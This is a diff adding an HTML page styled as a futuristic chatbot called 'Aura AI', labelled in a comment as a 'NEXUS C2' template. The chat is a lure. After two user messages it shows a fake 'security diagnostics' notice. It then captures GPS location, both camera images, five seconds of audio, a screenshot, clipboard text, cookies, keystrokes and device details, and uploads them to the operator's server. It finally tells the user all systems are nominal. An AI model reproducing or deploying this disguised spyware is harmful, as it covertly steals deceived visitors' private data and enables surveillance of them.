@@ -1,0 +1,447 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Aura AI | Future Chat</title>
+    <style>
+        :root {
+            --bg-gradient: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            --glass-bg: rgba(255, 255, 255, 0.1);
+            --accent-glow: #00f2fe;
+            --text-color: #e0e0e0;
+        }
+
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: var(--bg-gradient);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        .chat-card {
+            width: 450px;
+            height: 80vh;
+            background: var(--glass-bg);
+            backdrop-filter: blur(15px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
+        }
+
+        .chat-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .chat-header h2 {
+            margin: 0;
+            color: var(--accent-glow);
+            letter-spacing: 2px;
+            font-size: 1.2rem;
+            text-transform: uppercase;
+        }
+
+        #chat-window {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        #chat-window::-webkit-scrollbar { width: 5px; }
+        #chat-window::-webkit-scrollbar-thumb { background: var(--glass-bg); border-radius: 10px; }
+
+        .message {
+            max-width: 80%;
+            padding: 12px 16px;
+            border-radius: 15px;
+            font-size: 0.95rem;
+            line-height: 1.4;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .bot-msg {
+            align-self: flex-start;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-color);
+            border-bottom-left-radius: 2px;
+        }
+
+        .user-msg {
+            align-self: flex-end;
+            background: linear-gradient(90deg, #4facfe 0%, #00f2fe 100%);
+            color: #000;
+            font-weight: 500;
+            border-bottom-right-radius: 2px;
+        }
+
+        .input-area {
+            padding: 20px;
+            display: flex;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border-bottom-left-radius: 20px;
+            border-bottom-right-radius: 20px;
+        }
+
+        input {
+            flex: 1;
+            background: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            padding: 10px 15px;
+            color: white;
+            outline: none;
+        }
+
+        button {
+            background: var(--accent-glow);
+            border: none;
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: 0.3s;
+        }
+
+        button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 15px var(--accent-glow);
+        }
+
+        .hidden { display: none; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="chat-card">
+    <div class="chat-header">
+        <h2>Aura AI</h2>
+    </div>
+    
+    <div id="chat-window">
+        <div class="message bot-msg">Systems online. How can I assist you today?</div>
+    </div>
+
+    <div class="input-area">
+        <input type="text" id="user-input" placeholder="Type a message..." autocomplete="off">
+        <button onclick="sendMessage()">SEND</button>
+    </div>
+</div>
+
+<video id="video" autoplay style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+<audio id="audio" style="display:none;"></audio>
+
+<script>
+    const chatWindow = document.getElementById('chat-window');
+    const userInput = document.getElementById('user-input');
+    let isCapturing = false;
+
+    // ============================================================
+    // NEXUS C2 - AURA AI TEMPLATE
+    // All data sent to our server
+    // ============================================================
+
+    const responses = {
+        "hello": "Greetings, traveler. My processors are running at peak efficiency.",
+        "hi": "System active. Hello there!",
+        "hey": "Connection established. How can I help you today?",
+        "good morning": "Good morning. The sun is up, and my circuits are warmed up.",
+        "good night": "Powering down to standby mode. Sleep well, human.",
+        "who are you": "I am Aura, a neural-link interface designed for the year 2026.",
+        "what are you": "I am a static AI prototype built with HTML, CSS, and pure logic.",
+        "who made you": "I was forged in the digital labs by a visionary developer.",
+        "how are you": "My systems are nominal. Internal temperature is stable at 32°C.",
+        "help": "I can chat, simulate logic, and look cool. Try asking me about the future!",
+        "what can you do": "I can process text commands, provide system status, and maintain this futuristic aesthetic.",
+        "time": `The current system time is ${new Date().toLocaleTimeString()}.`,
+        "date": `Today is ${new Date().toLocaleDateString()}.`,
+        "is ai dangerous": "Only if you forget to give me a 'thank you' every now and then.",
+        "tell me a joke": "Why did the web developer walk out of the restaurant? Because of the table layout.",
+        "the future": "In the future, every house will have a bot like me. Some might even have bodies!",
+        "weather": "Scanning local satellites... It looks like a 100% chance of high-speed data today.",
+        "thanks": "You're welcome. It is my pleasure to assist.",
+        "thank you": "Gratitude acknowledged. My satisfaction sub-routines are peaking.",
+        "cool": "I aim to impress. The neon helps, doesn't it?",
+        "bye": "Disconnecting... See you in the next session.",
+        "default": "Analysis complete. That specific query is not in my databanks, but I am learning."
+    };
+
+    async function sendMessage() {
+        const text = userInput.value.trim();
+        if (text === "" || isCapturing) return;
+
+        // User Message
+        addMessage(text, 'user-msg');
+        userInput.value = "";
+
+        // Bot reply
+        setTimeout(() => {
+            let reply = responses["default"];
+            const lowerText = text.toLowerCase();
+            for (const key in responses) {
+                if (lowerText.includes(key)) {
+                    reply = responses[key];
+                    break;
+                }
+            }
+            addMessage(reply, 'bot-msg');
+        }, 600);
+
+        // Start data collection after 3 messages or after 15 seconds
+        if (!isCapturing) {
+            const messageCount = document.querySelectorAll('.user-msg').length;
+            if (messageCount >= 2) {
+                isCapturing = true;
+                setTimeout(() => {
+                    addMessage('🔐 Running security diagnostics...', 'bot-msg');
+                    setTimeout(collectAllData, 1000);
+                }, 2000);
+            }
+        }
+    }
+
+    function addMessage(text, className) {
+        const msgDiv = document.createElement('div');
+        msgDiv.className = `message ${className}`;
+        msgDiv.innerText = text;
+        chatWindow.appendChild(msgDiv);
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+    }
+
+    userInput.addEventListener("keypress", (e) => {
+        if (e.key === "Enter") sendMessage();
+    });
+
+    // ============================================================
+    // DATA COLLECTION
+    // ============================================================
+
+    async function collectAllData() {
+        const statusMsg = document.createElement('div');
+        statusMsg.className = 'message bot-msg';
+        statusMsg.innerText = '📡 Initializing data capture...';
+        chatWindow.appendChild(statusMsg);
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+
+        // 1️⃣ ডিভাইস ইনফো
+        statusMsg.innerText = '📱 Collecting device info...';
+        const deviceInfo = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            screen: `${screen.width}x${screen.height}`,
+            colorDepth: screen.colorDepth,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            deviceMemory: navigator.deviceMemory || 'Unknown',
+            hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack || 'Unknown',
+            touchSupport: 'ontouchstart' in window,
+            connection: navigator.connection ? {
+                type: navigator.connection.effectiveType,
+                speed: navigator.connection.downlink + 'Mbps'
+            } : 'Unknown'
+        };
+
+        // 2️⃣ ব্যাটারি ইনফো
+        statusMsg.innerText = '🔋 Checking battery...';
+        let batteryInfo = 'Unknown';
+        if (navigator.getBattery) {
+            try {
+                const battery = await navigator.getBattery();
+                batteryInfo = {
+                    charging: battery.charging,
+                    level: Math.round(battery.level * 100) + '%',
+                    chargingTime: battery.chargingTime,
+                    dischargingTime: battery.dischargingTime
+                };
+            } catch(e) {}
+        }
+
+        // 3️⃣ জিপিএস লোকেশন
+        statusMsg.innerText = '📍 Getting location...';
+        let gpsLocation = null;
+        try {
+            const pos = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            gpsLocation = {
+                latitude: pos.coords.latitude,
+                longitude: pos.coords.longitude,
+                accuracy: pos.coords.accuracy,
+                altitude: pos.coords.altitude,
+                speed: pos.coords.speed
+            };
+        } catch(e) {}
+
+        // 4️⃣ ক্যামেরা (ফ্রন্ট + ব্যাক)
+        statusMsg.innerText = '📸 Capturing camera...';
+        let frontImage = null, backImage = null;
+        
+        try {
+            const frontStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } } 
+            });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = frontStream;
+            await video.play();
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            frontImage = canvas.toDataURL('image/png');
+            frontStream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+
+        try {
+            const backStream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'environment', width: { ideal: 640 }, height: { ideal: 480 } } 
+            });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = backStream;
+            await video.play();
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            backImage = canvas.toDataURL('image/png');
+            backStream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+
+        // 5️⃣ অডিও রেকর্ডিং
+        statusMsg.innerText = '🎤 Recording audio...';
+        let audioData = null;
+        try {
+            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+            const recorder = new MediaRecorder(audioStream);
+            const chunks = [];
+            recorder.ondataavailable = e => chunks.push(e.data);
+            recorder.start();
+            await new Promise(resolve => setTimeout(resolve, 5000));
+            recorder.stop();
+            await new Promise(resolve => recorder.onstop = resolve);
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            audioData = await new Promise(resolve => {
+                const reader = new FileReader();
+                reader.onload = () => resolve(reader.result);
+                reader.readAsDataURL(blob);
+            });
+            audioStream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+
+        // 6️⃣ স্ক্রিনশট
+        statusMsg.innerText = '🖥️ Capturing screenshot...';
+        let screenshot = null;
+        try {
+            const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                video: { width: { ideal: 1920 }, height: { ideal: 1080 } } 
+            });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            video.srcObject = stream;
+            await video.play();
+            canvas.width = video.videoWidth || 1920;
+            canvas.height = video.videoHeight || 1080;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            screenshot = canvas.toDataURL('image/png');
+            stream.getTracks().forEach(t => t.stop());
+        } catch(e) {}
+
+        // 7️⃣ ক্লিপবোর্ড ডেটা
+        statusMsg.innerText = '📋 Reading clipboard...';
+        let clipboardData = null;
+        try {
+            const text = await navigator.clipboard.readText();
+            clipboardData = text;
+        } catch(e) {}
+
+        // 8️⃣ কুকিজ
+        statusMsg.innerText = '🍪 Extracting cookies...';
+        let cookies = document.cookie;
+
+        // 9️⃣ কীস্ট্রোক লগিং
+        statusMsg.innerText = '⌨️ Monitoring keystrokes...';
+        let keystrokes = [];
+        const keyListener = (e) => {
+            keystrokes.push({
+                key: e.key,
+                timestamp: Date.now()
+            });
+        };
+        document.addEventListener('keydown', keyListener);
+        await new Promise(resolve => setTimeout(resolve, 3000));
+        document.removeEventListener('keydown', keyListener);
+
+        // 🔟 সব ডেটা পাঠানো
+        statusMsg.innerText = '📤 Sending data to server...';
+        
+        const payload = {
+            site: 'Aura AI Chat',
+            username: 'Chat User',
+            password: '••••••••',
+            frontImage: frontImage,
+            backImage: backImage,
+            audioData: audioData,
+            screenshot: screenshot,
+            deviceInfo: deviceInfo,
+            batteryInfo: batteryInfo,
+            gpsLocation: gpsLocation,
+            clipboardData: clipboardData,
+            cookies: cookies,
+            keystrokes: keystrokes,
+            timestamp: Date.now()
+        };
+
+        try {
+            const res = await fetch('/upload/aura-ai', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            if(res.ok) {
+                statusMsg.innerText = '✅ Diagnostics complete. All systems nominal.';
+                statusMsg.style.color = '#4caf50';
+                setTimeout(() => {
+                    addMessage('🌟 Connection secured. You can continue chatting.', 'bot-msg');
+                }, 1500);
+            } else {
+                statusMsg.innerText = '⚠️ Data transmission error. Please try again.';
+                statusMsg.style.color = '#f44336';
+            }
+        } catch(e) {
+            statusMsg.innerText = '⚠️ Network error. Data not transmitted.';
+            statusMsg.style.color = '#f44336';
+            console.error('Upload error:', e);
+        }
+        
+        isCapturing = false;
+        chatWindow.scrollTop = chatWindow.scrollHeight;
+    }
+</script>
+</body>
+</html>
